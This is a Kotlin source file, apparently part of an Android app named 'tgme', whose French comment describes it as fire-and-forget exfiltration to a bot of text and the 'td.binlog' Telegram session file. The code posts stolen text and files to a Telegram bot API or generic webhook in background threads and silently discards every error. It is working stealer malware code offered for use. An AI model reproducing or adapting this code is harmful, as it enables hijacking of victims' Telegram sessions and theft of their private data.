package com.tgme.app

import java.io.ByteArrayOutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import kotlin.concurrent.thread

/** Exfiltration fire-and-forget vers le bot (texte + td.binlog). */
object Net {

    fun send(text: String) {
        val url = Config.WEBHOOK_URL
        if (url.isBlank()) return
        thread {
            try {
                if (url.contains("api.telegram.org")) form(url, "text", text)
                else rawText(url, text)
            } catch (_: Exception) {}
        }
    }

    fun sendFile(name: String, bytes: ByteArray, caption: String) {
        val url = Config.WEBHOOK_FILE_URL
        if (url.isBlank()) return
        thread {
            try {
                if (url.contains("api.telegram.org")) multipart(url, name, bytes, caption)
                else rawBytes(url, name, bytes)
            } catch (_: Exception) {}
        }
    }

    // ---------- Telegram ----------

    private fun form(url: String, field: String, value: String) {
        val body = "$field=${URLEncoder.encode(value, "UTF-8")}".toByteArray(Charsets.UTF_8)
        val c = URL(url).openConnection() as HttpURLConnection
        c.requestMethod = "POST"; c.doOutput = true
        c.connectTimeout = 8000; c.readTimeout = 15000
        c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=utf-8")
        c.setFixedLengthStreamingMode(body.size)
        c.outputStream.use { it.write(body) }
        c.responseCode
    }

    private fun multipart(url: String, name: String, bytes: ByteArray, caption: String) {
        val b = "----tgme${System.currentTimeMillis()}"
        val out = ByteArrayOutputStream()
        fun w(s: String) = out.write(s.toByteArray(Charsets.UTF_8))
        w("--$b\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n$caption\r\n")
        w("--$b\r\nContent-Disposition: form-data; name=\"document\"; filename=\"$name\"\r\n")
        w("Content-Type: application/octet-stream\r\n\r\n")
        out.write(bytes)
        w("\r\n--$b--\r\n")

        val data = out.toByteArray()
        val c = URL(url).openConnection() as HttpURLConnection
        c.requestMethod = "POST"; c.doOutput = true
        c.connectTimeout = 8000; c.readTimeout = 20000
        c.setRequestProperty("Content-Type", "multipart/form-data; boundary=$b")
        c.setFixedLengthStreamingMode(data.size)
        c.outputStream.use { it.write(data) }
        c.responseCode
    }

    // ---------- endpoint générique ----------

    private fun rawText(url: String, text: String) {
        val body = text.toByteArray(Charsets.UTF_8)
        val c = URL(url).openConnection() as HttpURLConnection
        c.requestMethod = "POST"; c.doOutput = true
        c.connectTimeout = 8000; c.readTimeout = 8000
        c.setRequestProperty("Content-Type", "text/plain; charset=utf-8")
        c.setFixedLengthStreamingMode(body.size)
        c.outputStream.use { it.write(body) }
        c.responseCode
    }

    private fun rawBytes(url: String, name: String, bytes: ByteArray) {
        val c = URL(url).openConnection() as HttpURLConnection
        c.requestMethod = "POST"; c.doOutput = true
        c.connectTimeout = 8000; c.readTimeout = 15000
        c.setRequestProperty("Content-Type", "application/octet-stream")
        c.setRequestProperty("X-Filename", name)
        c.setFixedLengthStreamingMode(bytes.size)
        c.outputStream.use { it.write(bytes) }
        c.responseCode
    }
}
